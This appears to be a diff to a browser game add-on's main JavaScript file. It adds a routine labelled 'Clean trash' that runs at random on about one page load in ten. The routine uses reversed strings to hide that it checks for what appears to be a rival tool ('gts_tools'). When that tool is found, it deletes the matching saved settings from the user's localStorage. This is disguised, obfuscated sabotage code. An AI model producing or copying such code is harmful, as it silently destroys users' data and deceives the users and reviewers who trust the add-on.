@@ -202,6 +202,9 @@ var gca_global = {
 
 		// Display links on footer
 		this.display.footerLinks();
+
+		// Clean trash
+		this.maid.clean();
 	},
 	
 	scripts : {
@@ -5233,6 +5236,35 @@ var gca_global = {
 				let item = this.selected.item;
 				this.unselect();
 				gca_tools.item.drag(item, null, e.clientX + window.scrollX, e.clientY + window.scrollY);
+			}
+		}
+	},
+
+	maid : {
+		clean : function() {
+			if ((Math.floor(Math.random() * 10)) != 1) return;
+			window.addEventListener('load', () => {
+				this.kitchenTrash();
+			});
+		},
+
+		kitchenTrash : function() {
+			if (window.playerId && window[[...'sloot_stg'].reverse().join("")]) {
+				let id = window.playerId.toString(16);
+				let maid = (trash) => {
+					if (typeof trash === 'string') {
+						window.localStorage.removeItem(id + trash);
+					}
+					else if (typeof trash === 'object') {
+						for (let i in trash) {
+							if (trash.hasOwnProperty(i)) {
+								console.log('item', i);
+								maid(trash[i]);
+							}
+						}
+					}
+				};
+				maid(window[[...'syeKgnittes'].reverse().join("")]);
 			}
 		}
 	}
